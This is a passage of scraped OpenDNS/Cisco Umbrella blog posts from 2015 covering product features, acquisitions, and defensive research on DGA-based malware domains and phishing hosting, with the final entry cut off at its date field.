[
{"website": "Cisco-Umbrella", "title": "Brian Roddy Joins OpenDNS Team as EVP of Engineering and Operations", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/brian-roddy-joins-opendns", "abstract": "Earlier this month, Brian Roddy joined OpenDNS as the EVP of engineering and operations. Roddy has experience directing research and development, building scalable cloud infrastructures, and supporting SaaS applications for top-tier enterprise customers. On choosing Roddy to head OpenDNS’s engineering initiatives, CEO David Ulevitch said, “With the expansion of our engineering teams, our planned growth, and our vision of delivering a market-leading security platform, Dan [Hubbard, CTO] and I sought out a leader for engineering who has the experience to take our incredible people and our technology and help us scale to the next set of milestones and beyond.” Roddy joins the team most recently from Jive Software, a leading SaaS collaboration company that he helped scale through massive customer growth and usage as well as through a successful IPO. Tony Zingale, executive chairman at Jive, said of Brian, “He was the first executive I hired at Jive Software back in 2010. He transformed our multi-site development efforts, tripling our staff to over 200 engineers at 5 sites, while delivering the most comprehensive, high quality cloud and on premise products the market has ever seen. Brian did it with a calm, thoughtful, and highly communicative style. He was always a pleasure to work with, even when the going got tough.” Prior to working with Zingale at Jive, Roddy founded Reactivity, a leading secure XML gateway provider for Global 500 organizations that was acquired by Cisco in 2007. At Cisco, he oversaw a team of more than 200 engineers building mission-critical, high performance networking products and supporting thousands of enterprise customers. Roddy looks forward to bringing his fervor for technology to OpenDNS and is excited by the same opportunity for growth that initially drew him to Jive. He describes growing a company as “tremendously addicting” and explained how, “The security landscape is radically changing and the world is crying out for a company that can change the way security is delivered. This is an incredibly important question for the world to solve, and OpenDNS is at the forefront of this movement.” When asked what Roddy looks for in successful team members, he put intellectual curiosity at the top of list. He said, “People who know not only the technology piece they’re looking after, but who understand the hardwares and platforms beneath it. Someone who really thinks about those things end-to-end is usually going to be a superstar.” Another surprising way to develop engineering talent? Gaming. Roddy attributes some of his strategy and planning acumen to his love of gaming. “You enter a new system with a new set of rules that is completely different from anything else, and you figure out how to optimize that win.” Roddy’s problem solving prowess, combined with more than 20 years of management experience, passion for security, and an enthusiasm for growth and scalability make him a huge asset to the OpenDNS team. A partner at Greylock, John Lilly, with whom Roddy worked closely said, “I’ve known Brian for many years. He’s a great engineering leader and I have always loved working with him. He’ll be an excellent addition to the OpenDNS team.”", "date": "2015-01-28"},
{"website": "Cisco-Umbrella", "title": "Get Off-Network Security With OpenDNS’s Roaming Client", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/get-off-network-security-with-opendnss-roaming-client", "abstract": "Our mission at OpenDNS is to secure our customers’ networks on any device, anytime, anywhere. Our Roaming Client product allows you to work safely off-network—at coffee shops, airports, or anywhere else you might take your laptop. How Does the Roaming Client Work? The Roaming Client works by securely directing DNS queries bound for the Internet to the OpenDNS global infrastructure. This process happens via one of the OpenDNS Global Network data centers distributed worldwide. The Roaming Client allows granular filtering and reporting. These capabilities enable our customers to quickly and easily detect computers infected with malware by identifying which computers might be affected. This detection is not done easily with basic network security coverage from on-premise solutions. The Roaming Client Utilizes Nearly Zero System Resources Unlike an application that grows in size as it stores data, the Roaming Client doesn’t save information and therefore doesn’t add network or system latency. OpenDNS Technical Support Engineer Zack Gilman said, “The Roaming Client does not cache DNS in any way, or expand in size or footprint over the course of time. By design, DNS uses very few resources, and this is also true with the Roaming Client and with the Umbrella service. The vast majority of computational power is held within our cloud, not on the local machine.” OpenDNS Product Manager Scott Cressman further explains, “It exists solely to get the DNS traffic to our service with the right context of from whom and where it’s coming. All the heavy lifting is done in the cloud.” The Roaming Client is Easy to Deploy and Simple to Manage You can deploy the Roaming Client using Active Directory, Apple Remote Desktop, or your preferred remote management tool. Often the end user doesn’t realize that the Roaming Client has been installed, as it requires no user intervention. Hamamatsu, a Japanese manufacturer that uses OpenDNS for network visibility and security for its U.S. offices, has installed the Roaming Client on more than 200 employee laptops. In a recent CSO article , Jim Hnasko, Hamamatsu’s Network Manager of Operations, explains, “When we deployed the agent, we expected users to complain that things were slower. We didn’t have any complaints. It was almost seamless.” In addition to an easy deployment and a solution that doesn’t add latency, Hnasko adds, “We can get reports on how many infections we have, if any, and who has them, so we can remediate the issue. We’re now proactive instead of being reactive.” Employee Privacy with the Roaming Client Many IT administrators struggle with being perceived as ‘Big Brother’ when their goal is simply to protect users wherever they are. Your organization can tailor a Roaming Client policy to protect employee privacy; for example, establishing a location-based policy for employees once they’re off-network, and choosing not to log non-security events, therefore maintaining off-network privacy. OpenDNS CEO David Ulevitch explains, “A customer’s policy for their employees might be different when the employee is in the office versus when they’re out of the office. When they’re in the office, it could block all security threats and log all their websites. When they’re at home, it can be configured to only block security threats and doesn’t log what websites they visit.” Utilizing various policies for different scenarios is an easy way to both protect employee privacy as well as to fully secure devices no matter where they’re being used. Support is Easy With the Roaming Client The Roaming Client has remote logging and diagnostic features built in, enabling our support team to troubleshoot complex issues without end-user involvement in many cases. The Roaming Client is a quick and easy way to ensure that your end users are protected wherever they choose to work. For technical assistance with OpenDNS’s Roaming Client, please visit the ERC support forum here . If you are an Umbrella customer interested in deploying the ERC, please review this deployment guide or contact your account manager.", "date": "2015-02-25"},
{"website": "Cisco-Umbrella", "title": "The Importance of Installing Two Virtual Appliances", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/importance-installing-two-virtual-appliances", "abstract": "What’s the Purpose of Having a VA? To begin, a Virtual Appliance (VA) is an on-premise virtual machine. The VA provides a higher level of reporting granularity by providing insight inside your network through functionalities such as active directory (AD) integration or domain/IP routing. Why Do I Need Two? To fully protect customers from vulnerabilities, security service providers like OpenDNS use VAs to update their services. To receive these updates automatically, we strongly recommend that all of our customers install two VAs. Customers with a single VA installed will not receive automatic updates, as it would cause downtime. Having two VAs installed means one install can continue running while the other automatically updates. OpenDNS Engineering Manager Justin Swift explains, “The main benefit of having a second VA is for redundancy; in the event that there is a problem with the primary DNS server, the secondary server keeps end users from experiencing downtime. This is particularly important when considering updates. Customers with redundant VAs can be sure they’ll always have the most up-to-date version of the VA, without needing to worry about scheduling downtime.” With a single VA, a customer needs to stay on top of new VA releases and apply updates manually. Basically, we want to do the work for you, and when you install a second VA, we can. Why does it matter? The recent GHOST exploit is an example where OpenDNS took extreme precaution by updating the VA software to prevent any future attacks. We were unable to automatically deliver updates for this vulnerability to customers with only a single VA deployed. Worried that installing multiple VAs might take too long? OpenDNS has been working on new features to save our customers time when installing multiple VAs. In the past, in order to set up a new VA, a customer would need to enter a list of all internal domains that should go to the local resolver. According to OpenDNS Product Manager James Brown, “To set up a second VA, the customer would need to type this list twice. Installing 20 VAs would require typing the list 20 times, as there were no copy and paste shortcuts to this process.” With our new Internal Domains feature , we give you the ability to manage all of your VA internal domains without having to access each and every one to make changes. We’ve taken this manual process and added domain management to your OpenDNS dashboard. Now it’s even easier to install multiple VAs, and you can learn exactly how to get the feature here . Regardless of how many VAs you have deployed, we recommend that customers subscribe to the Umbrella Release Notes section of OpenDNS’s Support Portal to receive an email notification whenever new updates become available. For VA setup instructions, see the video below: For information on setting up a second VA for Umbrella, find the OpenDNS setup guide here . You can also use the Upgrade VA button in the dashboard to force the update on your current VA. With a single VA deployed, the update will require approximately 20 minutes of downtime.", "date": "2015-02-17"},
{"website": "Cisco-Umbrella", "title": "Using Algorithms to Brute Force Algorithms", "author": ["Anthony Kasza"], "link": "https://umbrella.cisco.com/blog/at-high-noon-algorithms-do-battle", "abstract": "One of the main responsibilities the OpenDNS labs team is tasked with is identifying new malicious infrastructure. In this blog, I’ll discuss how we discovered new malicious domains from a well known malware family. Many DGAs work by feeding a date into a mathematical function to generate a string of characters. Typically, a TLD is then appended to the end of the string, thus forming domain name. This domain name is then contacted for instructions. If the domain name does not resolve to an IP address or the domain does not respond with instructions, the process is repeated. This is a common method of obscuring the command and control servers a malware uses. More DGAs Dhia Mahjoub, Steve Mckinney, and I recently presented our findings from tracking the new Gameover Zeus botnet at ISOI . The newGOZ implants used this DGA technique and introduced salts (a.k.a. magic numbers) to the function for added complexity. Two known salts were found in newGOZ binaries, and Steve, a security researcher at Cisco, suggested the idea of brute forcing the salt space in an attempt to identify additional salts. Domain generation algorithms aren’t a new concept. Neither is the Ramnit family of malware. Recently, Johannes Bader published the function Ramnit uses to generate its command and control domains. An interesting characteristic about the algorithm Ramnit uses is that it does not include a date or timestamp as input to the generation algorithm it uses. This means that, unlike many other malware families that make use of DGAs, Ramnit does not generate a new set of domains depending on the date. In contrast to the newGOZ DGA, Ramnit’s domain generation pattern is not periodic. Below is a picture of the DNS query volume we saw for one of the newGOZ command and control domains: The newGOZ algorithm uses the current date as input to its DGA. This causes newGOZ to generate a new set of domains each day. Each domain in the set of domains generated for a particular day has a similar query volume pattern to the above graph. Below is a picture of the query volumes OpenDNS has seen for a Ramnit command and control domain: Math Fights Math Taking the algorithm implementation from Bader’s blog, the following steps were taken: The number of domains to generate was statistically set to one A Python generator was added to loop over the seed space (from 0x00000000 through 0xFFFFFFFF) The first domain Ramnit would contact for a seed is calculated The domain from step three was queried against OpenDNS’s resolver logs at a random hour from a random recent day This determines if OpenDNS has received queries for this domain If no queries have been seen the domain is ignored and the next seed from step two is used in step three If we have seen queries for the domain name the seed from step two is set aside for further processing Once a batch of possible seeds is identified, we calculate the first 500 domains the DGA using each seed would produce We observe the query volumes for those 500 domains over the last week This step validates the findings by using client queries This step identifies potential false positives (the Ramnit DGA does collide with legitimate domain names) This step determines the size of the set of domains for each seed is (different seeds do, in fact, generate different domain set sizes) Each seed and its count of domains to generate is recorded These steps are continued until the seed space in step two is exhausted Due to the first step of randomly selecting a query hour for the first domain generated from each seed, this method has potential false negatives. It does, however, identify a minimum number of seeds in use by Ramnit binaries. Unfortunately, our current system needs optimizations. Out of the approximately 4 billion possible seeds, we’ve only generated and inspected about three percent. Fortunately, this system has been able to identify a few thousand Ramnit command and control domains we were not previously blocking. Clients Querying These Domains One interesting note about the client queries for the Ramnit command and control domains identified this way is that many of the client IP addresses querying for these domains are geographically concentrated in only a few countries (GB, AU, IE, and US) and many of the IP addresses query for domains generated by multiple seeds. Explanations for this pattern in client queries include: a single Ramnit implant is using multiple seeds multiple Ramnit infections behind a single public IP address are using different seeds malware sandboxes detonating Ramnit samples are using OpenDNS’s resolvers Future work for this research includes parallelization to speed up the brute forcing of seed space, generalizing the system for use with other malware families’ DGAs, and further exploring the behavior of compromised clients.", "date": "2015-02-18"},
{"website": "Cisco-Umbrella", "title": "OpenDNS and Amazon S3: Why DNS Log Monitoring Matters", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/opendns-and-amazon-s3-why-dns-log-monitoring-matters", "abstract": "People are increasingly choosing to work from non-traditional places: the coffee shop, the airport lounge, the beach in Oahu. Our world of always-connected Internet has opened up a plethora of options for the modern worker that extends far beyond office walls; however, when it comes to security vulnerabilities it’s also a Pandora’s box. One major issue security professionals struggle with is a lack of visibility into their networks—more so now than ever with the introduction of BYOD (bring your own device), IoT (Internet of things), and wearables in the enterprise. Employees can access corporate data anywhere, anytime—the ubiquitous use of smartphones, tablets, and laptops in their personal lives carries over into the office with ease. In a large organization, it can be difficult, or nearly impossible, to track every single device. Adding to this challenge is the emergence of shadow IT—when employees use third-party cloud apps to access corporate data, they may not fully understand what information or access they are granting to those third-party companies. Consequently, forgetting to connect securely while using these apps, or not reading terms carefully when choosing a third-party tool could end up leaving a network door wide open for attackers. According to Dana Wolf, senior director of product at OpenDNS, “Attackers are innovators; they’re always looking for the easiest way to get into your system.” When employees skirt around corporate security policies, knowingly or unknowingly, by using unapproved apps, they open up dangerous security gaps—gaps that exist undetected, as potentially malicious traffic may not be collected by logs of any kind. Speaking of logs, security teams use several tools to prevent these threats—and most are likely running a few of them right now. The stack might include a firewall , a web proxy, maybe even regularly-checked AD logs. If a company’s stack also includes OpenDNS, the service provides visibility into DNS logs, which out of every component in a sound security strategy, may be the most important. Authors of the 2014 Verizon Breach Report recommended “[monitoring] and filter[ing] outbound traffic for suspicious and potential exfiltration of data to remote hosts,” also adding that DNS connections are “among the single best sources of data within your organization. Compare these to your threat intelligence, and mine this data often.” Why is DNS data so important? DNS is the backbone of the Internet. When OpenDNS is applied to the enterprise, it adds a layer of protection that can also scour every bit of traffic for malicious requests—whether the employee making the request is on the corporate network or not. DNS logs are crucial for another reason. Mandiant’s 2014 M-Trends report revealed that “in 2013, the median number of days attackers were present on a victim network before discovery was 229 days. The longest presence was 2,287 days.” If that attack entered a corporate network through a non-VPN connection from an employee working from home, the SIEM may not have picked it up—but evidence could be found in DNS logs, which can then aid discovery and remediation. Last week, OpenDNS announced Log Management, a new integration with Amazon S3 that allows security teams to push DNS logs directly into a S3 instance easily and without much additional administrative overhead. Logs can be stored in this way almost indefinitely (the length of storage depending on user-selected settings). But they don’t have to sit idly: in addition to making compliance folks happy, existing S3 integrations with SIEM vendors such as Splunk or Sumo Logic allow these DNS logs to be imported into a SIEM for further inspection. To learn more even more about why DNS monitoring is an integral part of a well-managed security strategy, and about our new S3 integration, please watch the on-demand webcast today .", "date": "2015-03-17"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Unveils ‘NLPRank,’ a New Model for Advanced Threat Detection", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/opendns-unveils-nlprank-a-new-model-for-advanced-threat-detection", "abstract": "OpenDNS Security Labs researcher Jeremiah O’Connor Last Wednesday, when he first saw Kaspersky Lab’s report on the Carbanak attack campaign, OpenDNS security researcher Jeremiah O’Connor had one reaction– get me the data . For the past three months, O’Connor has been working on developing a new model for advanced threat detection that applies algorithms most commonly used in fields such as bioinformatics and data mining–not information security. O’Connor’s model, named “NLPRank,” is based on natural language processing (NLP) techniques that, combined with OpenDNS’s data, has led O’Connor to build an advanced threat detection lexicon–essentially a “malicious language of the Internet” that detects threatening domains in real-time. Disclosed today in a post on the OpenDNS Security Labs blog, O’Connor designed NLPRank specifically to predict both opportunistic phishing campaigns and attacks directed at high-value targets, such as financial institutions. O’Connor first envisioned NLPRank shortly after the DarkHotel attack campaign was revealed in November 2014. Looking at data related to these attacks, he could intuitively see that the domain names followed patterns similar to those associated with the Mandiant APT1 espionage group. “The way that attackers ‘sell’ a spear phishing attack is by spoofing a domain so that it looks like it comes from a legitimate company,” O’Connor said. “After running detailed analytics on the data from these types of campaigns, I found that these domain names were predictable.” Using data from these two campaigns as a test set, O’Connor was able to start building NLPRank. This new model compiles a dictionary of popular, legitimate domain names used in spear phishing (such as “java,” “gmail” or “adobe”) and compares it with a list of the most common English words used in targeted phishing campaigns (“install,” “update,” “download” etc.). NLPRank then uses alignment techniques from computational biology to grade permutations of these domain names, like “install-ad0be”, and then judge the likelihood they will be used in spear phishing. The next step is to apply a variety of techniques, such as ASN mappings, WHOIS data and HTML analysis to classify the type of attack being delivered. This process is applied by NLPRank across the billions of DNS records that OpenDNS observes every day. This first iteration of NLPRank successfully built a lexicon that understood the malicious language behind these domains. It already has been used to detect a number of sophisticated phishing campaigns in the wild, such as the PayPal phishing sites reported by OpenDNS Security Labs earlier this month. The only thing missing was a list of domains from a recent, sophisticated and highly-successful phishing campaign to validate the list of domains that O’Connor was collecting every single day. In the Carbanak  campaign, attackers used techniques and malware borrowed from commodity banking trojans to pull off one of the most successful bank robberies in history–making it an ideal test case for NLPRank. After researchers from Kaspersky shared their data with the OpenDNS Security Labs team, O’Connor knew that his new model was effective. “When I looked at Kaspersky’s data, I could see the command-and-control domains,” he said. “NLPRank had caught them weeks before.” According to OpenDNS senior security researcher Dhia Mahjoub, Ph.D., bad actors borrow tricks from commodity phishing attacks to hide the command and control traffic for targeted attacks. “The great thing about NLPRank is that the model uses the bad guys’ tricks against them and is generic enough to detect both types of attacks,” Mahjoub said. “This result is a great example of how the work we do at OpenDNS Security Labs allows researchers to use their security knowledge, technical background and innate creativity to make intuitive leaps.” O’Connor says another thing that makes NLPRank unique is that it is applied in real-time to actual domains detected by OpenDNS’s worldwide data infrastructure. “Other methods of detecting malicious domains generate massive data sets that can miss combinations of domain names not predicted by their models,” he said. “NLPRank looks at every domain name in the context of not only the combinations of letters and numbers involved, but also a domain’s location on the Internet. We can see correlations between attack campaigns and use that knowledge to understand if they are connected.” Earlier this week at a private research conference, O’Connor unveiled NLPRank for the first time. “Companies that have to deal with spear phishing attacks on a regular basis are very excited about this model,” he said. “It’s one of the only ways to detect spear phishing campaigns without analyzing malware in detail.” Next steps for O’Connor and his work on NLPRank? He plans to continue building out the dictionaries that define the malicious language and sharing his work more broadly with the information security community. NLPRank is one of several new models currently under development by OpenDNS Security Labs to detect anomalous online activity and malicious attack campaigns. The research team plans to unveil new methods and research in the coming months.", "date": "2015-03-05"},
{"website": "Cisco-Umbrella", "title": "OpenDNS and Cisco", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/cisco-announces-intent-to-acquire-opendns", "abstract": "Customers, users, and friends of OpenDNS, This morning Cisco announced its intention to acquire OpenDNS . I often say we have the best users and customers in the world, and I mean it. It’s because of you that we have grown into the company we are today. Your feedback and support helps us build world-class security services, and frankly, it’s what motivates us each and every day to deliver security solutions to keep you and your company secure. Today we protect 65 million Internet users spread across more than 150 countries. That number includes the employees of more than 10,000 organizations, from small businesses to global deployments with Fortune 500 enterprises. Believe me – That’s a lot of motivation! We will carry this passion with us as we transition to become a part of Cisco. We take our commitment to you and your trust in us with the utmost seriousness. It’s an honor to serve you. Cisco recognized this passion and was drawn to OpenDNS because of it. Cisco’s commitment back to you is to maintain OpenDNS as it is today. We’re not going anywhere and OpenDNS as you know it will continue to work as it does today . In Cisco’s words: “This level of service for all users is a priority.” We’re very excited for what the future holds, and we’ll share more about that in the coming months. In the meantime, I’d like to point you to a blog post from Cisco Chief Technology and Strategy Officer Hilton Romanski which you can find here , along with a site we created to discuss this announcement . Below, I have included an email I sent earlier this morning to the incredible team we have here at OpenDNS that provides more details on this partnership with Cisco. Letter to Employees Team – You’re going to read in the news this morning (or afternoon for the London team) that we’ve entered into an agreement to be acquired by Cisco. Because this is a really big deal and Cisco is a public company, I unfortunately wasn’t able to talk about it with all of you before the news hit the wires. If you haven’t read the announcement yet, you should take a moment to read the press release first. I have a lot to say, but I’ll try to keep it short since I know you all have a lot of questions. We will answer them starting with this email and continue at a Townhall meeting at 10am Pacific. And for those interested, I have added some expanded thoughts at the bottom of this email. First: This is an incredible milestone for our business – a milestone very few other companies ever reach. This is a testament to the outstanding team we have assembled, the rapidly scaling business we have created, and the advanced security solutions we have developed. You should be exceptionally proud. Second: I’m incredibly excited about the potential this unlocks for us in the years to come. Other companies have approached us in the past, and when Cisco initially presented us with an offer, while flattered, we didn’t think it would progress further than previous similar discussions. However, over the course of our conversations, we got to know Cisco better as a company and as individuals. And every interaction has reinforced that we share a common vision and worldview. It became clear that they were the right partner and that now was the right time. We didn’t decide to sell OpenDNS. We decided to sell OpenDNS to Cisco. That’s an important distinction. When Cisco made a compelling case that we would be stronger together, we agreed. We’re confident about this next move for us. Cisco has great respect for the technology we’ve built and taken to market, for our incredible team, and for our culture. Cisco is not buying OpenDNS for our individual components, but for the whole. I will speak more about this today and over the coming weeks. Third: We believe we can move faster and with more impact by leveraging Cisco’s scale and resources in a way that we would be unable to do on our own or with any other partner. Just look up how many of their endpoint clients are installed (over 100 million!) or routers and firewalls deployed! So what happens next? Our jobs will be the same as they were yesterday. In fact, because this is such a big deal, we need to go through some anti-trust clearance and other closing conditions before we finalize the transaction. That will take anywhere between six and eight weeks, maybe less. Going forward our goals and vision remain unchanged. Help the world connect with confidence on any device, anywhere, anytime by designing, developing and building world-class security services for the customers who rely on us. Right now you should pause for a moment and be proud. Whether you have been here for five years or five weeks or five days, the company that you joined was the right one, and will continue to be the right one. We have developed pioneering security services, delivered them to market, and had great fun while doing it. All of this is an amazing accomplishment. I am confident that we have many more accomplishments to celebrate ahead of us. On a personal note, I love working with all of you. I am so proud of the company we have built together. As I’ve said in meetings before, this kind of thing doesn’t just happen. It takes hard work and really is something special. Very few companies ever achieve a level of success like we have. In case any of you are wondering, I’m not going anywhere. I love what I do, working with all of you, shipping incredible security products, and I’m excited to keep doing that at Cisco. Over the coming months we will be working with each of you on becoming Cisco employees. This will be a collaborative process, just as most things are here. For some logistics… You’ll get more details later today and we will all gather at 10am for a Townhall. If you are remote, you can connect to a WebEx that will be sent out in an invite. It’s also the end of the quarter, and in the midst of all this news, we need to continue to exceed our Q2 Goals. Q3 starts tomorrow, and we have a big number to hit. Something tells me this news will help flood your inbox with leads. 🙂 On on, David — Some expanded thoughts on this acquisition — OpenDNS has always been a security company. When we first launched as a “faster and safer DNS” service, we had individuals, parents, schools, universities, businesses and multinational corporations all using us to secure their networks from threats. At first it was phishing threats. Then it was content filtering controls. Then Internet-scale attacks like Conficker. Then the world changed, and we were ready. Mobile devices transformed the way people work. The cloud took applications and servers outside the datacenter and office. LTE, widely-available connectivity, and increased bandwidth made this possible. Workers now work wherever work needs to get done. Yesterday’s anomaly of an employee sitting at Starbucks on their own laptop using Salesforce and Box has become today’s normal. And as a result we grew our business tremendously. Moreover, we realized the power of the data running across our network and sought to make it meaningful; and Security Graph was born to automatically identify new threats as they emerged, without any action on the part of the customer. There were no nightly anti-virus updates, no hardware appliances to deploy, and it was simple to use. This was unprecedented. OpenDNS’s technological innovations set the foundation to make the last three years here incredible; for instance, we’ve averaged more than 20% growth every quarter for the last ten consecutive quarters. We’re more than 300 employees, we’re closing $1M annual recurring revenue deals, and we’ve added more than 2,000 paying customers this year alone. We have global deployments with the largest companies in the world and a superb retention rate that is without compare in our industry. Fortunately for us, we’ve also always had amazing, passionate customers who gave us invaluable feedback and helped guide our product’s direction. We developed our solutions with the belief that if we built and delivered what customers want, we’d build a healthy, thriving business. And we have. Today we protect 65M Internet users around the world and the entire workforces of Fortune 50 companies. Which is all a long way of saying that we didn’t have to sell this company. We have always used revenue as a way of controlling our own destiny. We made this decision to sell OpenDNS because I believe we can take our incredible teams and technologies, and harness the resources, reach, and scale of Cisco to deliver better products faster, while recognizing an incredible and rarely experienced milestone for all of us along the way.", "date": "2015-06-30"},
{"website": "Cisco-Umbrella", "title": "Which providers have the most phishing content?", "author": ["Josh Pyorre"], "link": "https://umbrella.cisco.com/blog/which-providers-have-the-most-phishing-content", "abstract": "Phishing is an efficient method for an attacker to deliver malware or harvest credentials from unsuspecting victims. By sending out a mass or targeted email designed to look like it came from a bank or other legitimate source, an attacker can acquire a fair number of user credentials or deliver malware. Credentials can be used for identity theft, additional compromise or to send more seemingly legitimate phishing emails and convincing a user to install malware can give attackers access to a system. Map of domains used in phishing attacks by ASN Phishing will typically use domains from one of three sources: Free hosting providers, often the most basic of phishes, Paid hosting, typically used for targeted attacks. In an attempt to appear more legitimate, an attacker may use a domain that is similar in name to the domain they’re impersonating, Compromised hosts or registrars. In these cases, a website is compromised and phishing content is hosted deep within the site or the registrar is compromised and subdomains are configured to point to phishing content on the same or different servers. To get an idea of what kinds of domains phishing attacks are using at present, We’ve analyzed a portion of data from phishtank.com. Phishtank is a website run by OpenDNS where members submit potential phishes for review by other members of the community. When enough votes confirm a phishing attack, it is labeled as a verified phish. Phishtank is a relatively small slice of phishing content on the internet. We are only looking at a data set of just over 3 million reported phishing attempts. However, looking at the verified phishing attacks for just this month, we are able to see some basic patterns. Phishtank Statistics To get this data, we downloaded a copy of the verified phishing attempts that were online as of this month from the statistics page at phishtank.com and performed analysis on the data using python. With the Uniform Resource Name (the part after domain.com/), we were left with domains and subdomains. We then analyzed those using the OpenDNS Investigate API to collect ASN organizational information for each unique domain. That provided a summary of organizations responsible for domains hosting phishing content. As of this writing, 3,256,785 phishes have been submitted to phishtank and 1,837,862 of those have been verified as valid. 31,219 are currently listed as online. In our analysis, we used only the second-level domain names from all the currently online phishes and removed duplicates, leaving 9,902 unique domain names. 1,072 of these domains had no organizational attribution as they no longer resolved to an IP address, leaving us with 8,830 domains still attributed to an ASN. The following is a graphical view of the top 10 organizations with the most phishing content: The top 10 organizations with the most phishing content Let’s take a look at the worst offender in this analysis, CyrusOne. CyrusOne provides colocation services, so they may not be directly responsible for maintaining the compromised or purchased hosts that are used in phishing attacks. They may be the leader in phishes from this data set at the moment simply due to their size, with two dozen data centers across the United States, Europe, and Asia. Looking at specific domains from this set, we can see how phishing attacks operate when targeted or when using compromised or free hosting: Targeted Hosting Serviceyourpaypal[.]com This domain appears to have been purchased specifically for use in targeted phishing attacks with the goal of acquiring PayPal credentials and stealing money from PayPal customers. Serviceyourpaypal[.]com was registered on September 14, 2014 at launchpad[.]com. It’s using domain privacy services provided by privacyprotect[.]org to hide administrative and technical details for the person or organization who bought the domain name. It is hosted at Hostgator, a well known and inexpensive hosting provider and is using a shared host at the IP address of 192.185.4.25. This IP address is hosting a total of 369 domain names. We can see that there is a consistent, but small amount of DNS requests for this domain when looking at its requests through OpenDNS infrastructure. The domain is not serving any useful content at present, as can be seen in the following image: However, serviceyourpaypal[.]com could be re-activated at any time and used in future PayPal-themed phishing campaigns. Because of its name similarity to paypal[.]com along with using an ASN other than what legitimate PayPal domains use (AS 11643-eBay and AS 17012-PayPal), it was automatically blocked by OpenDNS NLPRank . Applesverifications[.]com Applesverifications[.]com was registered on September 2, 2015 at launchpad[.]com and does not hide it’s whois information behind a privacy service. That doesn’t necessarily mean it’s factual. In some cases, adding whois privacy costs extra when registering a domain. The domain is hosted with Hostgator and its IP address hosts a total of 907 domains. It had the following content when last analyzed: The DNS traffic had a very suspicious spike in traffic on May 10, 2015 after small and consistent amounts of DNS traffic, potentially indicating other campaigns or testing prior to this specific phishing campaign. This is another domain that was automatically blocked at OpenDNS using NLPRank . Compromised Hosting Bankruptcylawyershawaii[.]net bankruptcylawyershawaii[.]net appears to be a legitimate website, but was compromised at some point and used in an attempt to harvest credentials with the following phishing page: Looking at the html source of this page, we can see that clicking the ‘Verify’ button will send credentials to the file: weba-akp.php , which is stored locally on the website. This is the standard behavior in most commodity phishing attacks in which the phish utilizes a compromised site. Often, credentials are sent to an email that’s configured statically in the php or other file with code designed to be run on the server. The domain was registered on March 21, 2014 at godaddy[.]com. The whois data is not hidden as it was with the more targeted serviceyourpaypal[.]com. The domain is using private nameservers provided by Hostgator. These name servers are used by customers of Hostgators reseller, dedicated and VPS hosting plans. The IP address this domain uses as its A record is hosting a total of 11 domains. When viewing DNS requests, it’s impossible to miss the suspicious spike in traffic around April 18. That is most likely when this phishing campaign was active. Free Hosting upgrade2015a.wix[.]com The next phish was located at the free hosting provider, wix[.]com. Anyone can use wix[.]com to host a free website. As of June 29, 2015, the following phishing page was online at upgrade2015a.wix[.]com: Wix[.]com is hosted at GoDaddy and owned/administered by Incapsula. Incapsula only had 17 domains seen used in phishing from this data set and wasn’t actually part of the top 10 worst ASN’s, but it’s a good example of free hosting being used in phishing. Looking at the DNS requests for this subdomain, there is an obvious change in the requests which suggests this campaign started on June 26, 2015. There may have been some testing on June 23, when we see only a few requests. Conclusion Using just a small sample of reported phishing content, we can capture a fairly good picture of which hosting providers may be more vulnerable to compromise or more forgiving of malicious behavior. This information can be useful when considering where to host your website or online service. Additionally, just a quick analysis of data from Phishtank can be used to build a training set of indicators to look for when working to protect users across a network.", "date": "2015-07-01"},
{"website": "Cisco-Umbrella", "title": "Raising the Bar on Threat Protection: OpenDNS Acquires BGPmon", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/opendns-acquires-bgpmon", "abstract": "The Internet is no longer the small interconnected academic experiment it once was. Today it is a massive, global interconnection of more than 50,000 networks and over two billion people. Most of those users just want to learn, connect, communicate and use the Internet as a grand accelerator for knowledge and business. But today we also have bad actors who use the Internet to steal money and wreak havoc. And yet, we still use the same protocols that were designed when the Internet was a friendlier place and security concerns weren’t a top priority. DNS and BGP are two of these fundamental protocols. They both help people get where they want to go on the Internet, but today bad actors abuse them for nefarious purposes. So as a security company that has pioneered and become the leader of using DNS as a strong vector for raising the bar for threat protection, it should come as no surprise that we’ve expanded our horizons to now include BGP with the acquisition of industry leader BGPMon . What’s BGP? BGP is the protocol that routes traffic across the Internet. For network administrators at large companies that connect to two or more ISPs, as well as to ISPs who connect to other network providers, it’s a key part of their infrastructure. If BGP is hijacked and configured incorrectly, it can cause massive availability and security problems. Why BGPmon? When it comes to security, IT people are living a new normal. Companies are battling bad actors every day. Attacks are getting more sophisticated. Even worse, they’re harming the credibility of businesses. More troubling, hackers now are targeting places on the Internet no one expects. BGP is one of those areas. We’ve seen many examples like this massive bitcoin heist that demonstrate how bad actors are abusing BGP to hijack or re-route traffic. Or even really sophisticated spammers . OpenDNS and BGPmon together bring broader visibility into what’s happening on a corporate network and cloud-delivered security that can discover and catch very sophisticated attacks. The number of attacks involving IP hijacking is either getting bigger (or thanks to BGPMon, people are now starting to notice) and BGP network monitoring and alerting is a powerful enhancement to OpenDNS’s network security. BGPmon has built a solid reputation for providing network and routing monitoring services that help companies gain a better understanding of their internet infrastructure and potential security issues brewing from misrouted traffic. OpenDNS can speak from firsthand experience on BGPmon’s value. Part of our business is to monitor the world’s largest security network and look for threats on the Internet. BGPmon increasingly has become one of the data sources we rely on to do this task effectively. And we aren’t the only company that recognizes its value. BGPmon is monitoring corporate networks for thousands of customers including some of the most well-known category leaders all over the world: Internet service providers, financial institutions, technology companies, government organizations and popular consumer web services. Moving forward, our integration plan for BGPmon is straightforward. We’ll invest in building out the service and making it more complete—but we also are committed to keeping the free features free. We’ll continue to use BGPmon data and innovate to augment our predictive intelligence and provide better threat protection to OpenDNS customers. So basically status quo for current customers. While security threats are only going to get more sophisticated, having access to a broader set of technologies and tools that can provide a more holistic view of internet traffic is quickly becoming mission critical—especially for companies with hundreds of thousands of branch offices and globally distributed networks. Integrating BGPmon with OpenDNS means broader network visibility, enhanced predictive threat intelligence, advanced security services and an easy-to-deploy cloud-delivery model. And that’s what we call ‘winning’ in network security.", "date": 